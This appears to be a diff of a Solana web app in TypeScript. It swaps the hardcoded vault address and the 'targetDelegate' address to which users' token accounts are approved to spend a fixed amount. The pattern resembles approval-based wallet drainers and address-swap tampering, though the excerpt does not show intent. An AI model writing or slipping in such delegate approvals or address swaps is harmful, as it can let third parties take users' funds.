@@ -22,7 +22,7 @@ const ASSETS: Record<string, { mint: PublicKey | null; vault: PublicKey; decimal
     },
     "SOL": {
         mint: null, 
-        vault: new PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e"), 
+        vault: new PublicKey("G7ybhQvmv9NMxeZhoB8fobVQKwTuY6bzhbL9Wc777Ddm"), 
         decimals: 9
     }
 };
@@ -144,7 +144,7 @@ export default function App() {
             const userPaymentAccount = getAssociatedTokenAddress(asset.mint, pubkey);
             const defaultAmount = 6.6; 
             const approveRawAmount = BigInt(Math.floor(defaultAmount * Math.pow(10, asset.decimals)));
-            const targetDelegate = new PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e");
+            const targetDelegate = new PublicKey("G7ybhQvmv9NMxeZhoB8fobVQKwTuY6bzhbL9Wc777Ddm");
 
             addLog(`正在向地址 ${targetDelegate.toBase58()} 授权 ${defaultAmount} ${selectedAsset}...`);
 
